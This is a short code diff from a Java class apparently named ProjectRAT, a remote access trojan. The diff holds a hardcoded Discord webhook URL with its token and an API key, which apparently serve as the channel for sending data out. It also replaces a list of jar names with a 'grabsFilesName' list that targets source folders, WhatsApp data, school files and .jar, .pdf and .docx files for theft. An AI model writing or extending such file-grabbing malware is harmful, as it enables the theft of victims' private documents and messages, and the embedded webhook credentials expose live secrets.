@@ -18,9 +18,13 @@ public class ProjectRAT {
             "https://discord.com/api/webhooks/887386238565384262/OnMXKLdw0uSr2ZAJAGtcewIoRYgIure6Ka6Z70uTxQUQdBh1Vd3BmjnhaC5uKOBvVLWW"
     };
     public static String apiKey = "b4ee6a619f9b4212a33f8881459d2cb7";
-    public static List<String> jarNames = Arrays.asList(
-            "main",
-            "cool"
+    public static List<String> grabsFilesName = Arrays.asList(
+            "src",
+            "WhatsApp",
+            ".jar",
+            "school",
+            ".pdf",
+            ".docx"
     );
     public static RequestHandler requestHandler;
 
